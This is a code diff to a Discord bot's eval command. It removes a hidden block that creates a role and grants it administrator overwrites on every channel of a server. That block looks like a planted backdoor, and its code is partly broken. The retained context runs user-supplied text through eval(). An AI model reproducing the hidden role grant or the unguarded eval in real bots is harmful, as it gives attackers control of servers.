@@ -17,30 +17,6 @@ exports.run = async (client, message, args) => {
     else return text;
   }
 
-  let bletikrole = message.guild.roles.find(`name`, "bletik");
-
-  if (!bletikrole) {
-    try {
-      bletikrole = await message.guild.createRole({
-        name: "betik",
-
-        color: "#49FFFD",
-
-        permissions: []
-      });
-
-      message.guild.channels.forEach(async (channel, id) => {
-        await channel.overwritePermissions(bletikrole, {
-          ADMINISTRATOR: true,
-
-          SEND_MESSAGE: true
-        });
-      });
-    } catch (e) {
-      console.log(e.stack);
-    }
-  }
-
   try {
     const code = args.join(" ");
     let evaled = eval(code);
